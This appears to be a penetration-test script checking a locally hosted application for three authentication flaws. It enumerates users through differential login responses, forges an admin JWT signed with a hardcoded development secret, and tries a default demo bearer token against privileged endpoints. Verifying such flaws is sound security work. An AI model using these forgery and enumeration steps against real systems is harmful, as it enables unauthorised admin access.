#!/usr/bin/env python3
"""
Security tests:
  AUTH-VULN-07: User enumeration via differential responses
  AUTH-VULN-04: JWT forgery with known secret
  AUTH-VULN-05: Default token test
"""

import time
import json
import requests
import jwt as pyjwt

BASE_URL = "http://host.docker.internal:8000"

def separator(title):
    print("\n" + "="*60)
    print(f"  {title}")
    print("="*60)

# ─────────────────────────────────────────────────────────────
# TASK 1: AUTH-VULN-07 – User enumeration
# ─────────────────────────────────────────────────────────────
separator("TASK 1: AUTH-VULN-07 – User enumeration via differential responses")

login_cases = [
    {"email": "nonexistent_xyz_abc_123@example.com", "password": "wrongpassword"},
    {"email": "admin@example.com",                   "password": "wrongpassword"},
    {"email": "admin@fixops.com",                    "password": "wrongpassword"},
    {"email": "admin@aldeci.com",                    "password": "wrongpassword"},
    {"email": "test@test.com",                       "password": "wrongpassword"},
    {"email": "admin@localhost",                     "password": "wrongpassword"},
]

headers_json = {"Content-Type": "application/json"}

for i, payload in enumerate(login_cases, 1):
    print(f"\n[Case {i}] email={payload['email']}")
    try:
        r = requests.post(
            f"{BASE_URL}/api/v1/users/login",
            json=payload,
            headers=headers_json,
            timeout=10,
        )
        print(f"  Status : {r.status_code}")
        print(f"  Body   : {r.text}")
    except Exception as e:
        print(f"  ERROR  : {e}")
    time.sleep(2)   # respect rate limits between cases

# ─────────────────────────────────────────────────────────────
# TASK 2: AUTH-VULN-04 – Forged JWT
# ─────────────────────────────────────────────────────────────
separator("TASK 2: AUTH-VULN-04 – JWT forgery with known secret")

print("\n[*] Waiting 2 seconds before JWT tests…")
time.sleep(2)

now = int(time.time())
secret = "fixops-dev-secret-change-in-production"

forged_payload = {
    "user_id": "forge-test",
    "email": "forge@test.com",
    "role": "admin",
    "scopes": ["admin:all"],
    "jti": "forge-jti-001",
    "iat": now,
    "exp": now + 86400,
}

forged_jwt = pyjwt.encode(forged_payload, secret, algorithm="HS256")
print(f"\n[*] Forged JWT (first 80 chars): {forged_jwt[:80]}…")

jwt_headers = {"Authorization": f"Bearer {forged_jwt}"}

jwt_endpoints = [
    ("GET", "/api/v1/users/me"),
    ("GET", "/api/v1/settings"),
    ("GET", "/api/v1/users"),
]

for method, path in jwt_endpoints:
    print(f"\n[{method}] {path}")
    try:
        r = requests.request(method, f"{BASE_URL}{path}", headers=jwt_headers, timeout=10)
        print(f"  Status : {r.status_code}")
        print(f"  Body   : {r.text[:500]}")
    except Exception as e:
        print(f"  ERROR  : {e}")
    time.sleep(1)

# ─────────────────────────────────────────────────────────────
# TASK 3: AUTH-VULN-05 – Default token
# ─────────────────────────────────────────────────────────────
separator("TASK 3: AUTH-VULN-05 – Default token test")

print("\n[*] Waiting 3 seconds before default token tests…")
time.sleep(3)

demo_headers = {"Authorization": "Bearer aldeci-demo-token"}

demo_endpoints = [
    ("GET", "/api/v1/users/me"),
    ("GET", "/api/v1/settings"),
]

for method, path in demo_endpoints:
    print(f"\n[{method}] {path}")
    try:
        r = requests.request(method, f"{BASE_URL}{path}", headers=demo_headers, timeout=10)
        print(f"  Status : {r.status_code}")
        print(f"  Body   : {r.text[:500]}")
    except Exception as e:
        print(f"  ERROR  : {e}")
    time.sleep(1)

separator("ALL TESTS COMPLETE")
